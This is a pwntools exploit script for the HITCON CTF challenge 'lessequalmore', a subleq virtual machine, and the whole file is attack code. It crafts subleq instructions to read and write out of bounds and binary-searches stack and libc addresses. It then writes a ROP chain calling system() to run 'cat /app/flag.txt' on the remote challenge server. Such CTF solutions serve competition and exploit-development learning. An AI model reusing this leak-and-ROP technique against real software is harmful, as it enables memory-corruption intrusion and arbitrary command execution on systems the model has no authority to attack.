from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './lessequalmore'
HOST = 'chal-lessequalmore.chal.hitconctf.com'
PORT = 11111
#HOST = '172.17.0.2'
#PORT = 9999
#HOST = '172.17.0.1'
#PORT = 11111

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process([TARGET, './chal.txt'])
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

pc = 0x10
def subleq(v0, v1, j=-1):
    global pc
    pc += 3
    if j == -1:
        return f'%x{v0:x}\n%x{v1:x}\n%x{pc:x}\n'.encode()
    else:
        return f'%x{v0:x}\n%x{v1:x}\n%x{j:x}\n'.encode()

def clear(idx):
    return subleq(idx, idx)
def input_value(idx):
    return subleq(0x8000000000000000, idx)

def output_value(idx):
    return subleq(idx, 0x8000000000000000)

libc_offset = 0x83ff0
environ_ptr = 0x221200
got_malloc_ptr = 0x219010

r = start()

r.recvuntil(b'\n')

payload = b''

# stack leak
payload += subleq(0x10, 0xdead)
payload += subleq((libc_offset+environ_ptr)//8, 0)
payload += subleq(0, 1)
payload += clear(2)
payload += input_value(2)
payload += clear(3)
payload += input_value(3)

# value search loop
lab_value_search = pc
payload += output_value(2) # print \xff
payload += clear(0)
payload += input_value(0)
payload += subleq(1, 0, lab_value_search)

payload += output_value(3) # print \x02
payload += subleq(3, 0, pc+3+3) # break
payload += subleq(5, 5, lab_value_search)

# libc leak
payload += output_value(5) # print \x00
payload += subleq(6, 7, pc+3*6) # break
payload += input_value(6) # write flag to break
payload += clear(1)
payload += subleq((libc_offset+got_malloc_ptr)//8-4, 0) # change reg1 to libc addr
payload += subleq(0, 1)
payload += subleq(1, 5, lab_value_search) # search again

# after leak
## wipe and write stack
### wipe
payload += input_value(0x398//8)
payload += input_value(0x3a0//8)
payload += input_value(0x3b0//8)
payload += input_value(0x3b8//8)
payload += input_value(0x3c8//8)
payload += input_value(0x3d0//8)

## write
payload += input_value(0x3e8//8)
payload += input_value(0x490//8)
payload += input_value(0x400//8)
payload += input_value(0x4a0//8)
payload += input_value(0x418//8)
payload += input_value(0x4b0//8)

payload += clear(0)
payload += clear(0)
payload += clear(0)

payload += subleq(0x490//8, 0)
payload += subleq(0x4a0//8, 0)
payload += subleq(0x4b0//8, 0)

payload += input_value(0x4c0//8)
payload += input_value(0x4c8//8)
payload += input_value(0x4d0//8)

payload += subleq(0, 0, 0xdeadbeefdeadbeef)

r.send(payload)
for i in range(0x3fe-payload.count(b'%')):
    r.sendline(f'%x{0xbeefbeef:x}'.encode())
r.sendline(f'%x{0x10000000000000010-1040:x}'.encode())

if args.D:
	debug(r, [0x16e5])
#pause()

r.sendline()
r.sendline(b'%xffffffffffffffff')
r.sendline(b'%x02')
r.recvuntil(b'\xff')

WAIT = 0.1
left = 0x7ff000000000
right = 0x800000000000
while left <= right:
    mid = (left + right) // 2
    mid &= 0xfffffffffffffff0
    r.sendline(f'%x{(mid)+1:x}'.encode())
    ret = b''
    while len(ret) < 1:
        ret += r.recvrepeat(WAIT)
    if ret == b'\x02\x00': #found
        break
    elif ret == b'\x02\xff': #over
        right = mid - 0x10
    else: #under
        left = mid + 0x10

leak = mid
dbg('leak')

target = leak - 0x148+0x70+0x50 -0xc0
dbg('target')
r.sendline(b'%x1beefbeef') #mem7
r.recvuntil(b'\xff')

left = 0x7f0000000000
right = 0x7fe000000000
while left <= right:
    mid = (left + right) // 2
    mid &= 0xfffffffffffffff0
    r.sendline(f'%x{(mid)+2:x}'.encode())
    ret = b''
    while len(ret) < 1:
        ret += r.recvrepeat(WAIT)
    if ret == b'\x02\x00': #found
        break
    elif ret == b'\x02\xff': #over
        right = mid - 0x10
    else: #under
        left = mid + 0x10
leak = mid
dbg('leak')

base = leak - 0xa5120
heap = base -0x83ff0
dbg('base')
system = base + 0x50d60
system = base + 0x508f0+2
binsh = base + 0x1d8698
rdi = base + 0x001bc021

r.sendline(f'%x{(target-heap)//8:x}'.encode())
r.sendline(f'%x{(target-heap)//8:x}'.encode())
r.sendline(f'%x{(target+8-heap)//8:x}'.encode())
r.sendline(f'%x{(target+8-heap)//8:x}'.encode())
r.sendline(f'%x{(target+0x10-heap)//8:x}'.encode())
r.sendline(f'%x{(target+0x10-heap)//8:x}'.encode())

r.sendline(f'%x{(target-heap)//8:x}'.encode())
r.sendline(f'%x{0x10000000000000000-rdi-0xbeefbeef:x}'.encode())
r.sendline(f'%x{(target+8-heap)//8:x}'.encode())
r.sendline(f'%x{0x10000000000000000-(heap+0x4c0)-0xbeefbeef:x}'.encode())
r.sendline(f'%x{(target+0x10-heap)//8:x}'.encode())
r.sendline(f'%x{0x10000000000000000-system-0xbeefbeef:x}'.encode())

r.sendline(f'%x{u64(b"cat /app")-0xbeefbeef:x}'.encode())
r.sendline(f'%x{u64(b"/flag.tx")-0xbeefbeef:x}'.encode())
r.sendline(f'%x{0x10000000000000074-0xbeefbeef:x}'.encode())
r.sendline(f'%x{0x10000000000000000-system-0xbeefbeef:x}'.encode())

r.interactive()
r.close()
